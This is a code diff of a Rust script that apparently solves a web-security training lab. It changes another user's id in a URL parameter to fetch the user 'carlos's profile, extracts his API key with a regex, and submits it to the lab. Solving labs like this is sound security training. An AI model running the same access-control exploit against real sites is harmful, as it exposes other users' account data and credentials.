@@ -34,36 +34,40 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a3d00b304c1a0fc884d500300bd00e8.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    // fetch the carlos profile using id URL parameter
     print!("{} ", "1. Fetching carlos profile page..".white());
     io::stdout().flush();
+
+    // fetch the carlos profile using id URL parameter
     let carlos_profile = client
         .get(format!("{url}/my-account?id=carlos"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch carlos profile".red()));
-    println!("{}", "OK".green());
 
-    // extract the API key of carlos
+    println!("{}", "OK".green());
     print!("{} ", "2. Extracting the API key..".white());
     io::stdout().flush();
+
+    // extract the API key of carlos
     let body = carlos_profile.text().unwrap();
     let api_key = capture_pattern("Your API Key is: (.*)</div>", &body)
         .expect(&format!("{}", "[!] Failed to extract the API key".red()));
-    println!("{}", "OK".green());
 
-    // submit solution
+    println!("{}", "OK".green());
     print!("{} ", "3. Submitting solution..".white());
     io::stdout().flush();
+
+    // submit solution
     let submit_ansewer = client
         .post(format!("{url}/submitSolution"))
         .form(&HashMap::from([("answer", api_key)]))
         .send()
         .expect(&format!("{}", "[!] Failed to submit solution".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "[#] Check your browser, it should be marked now as"
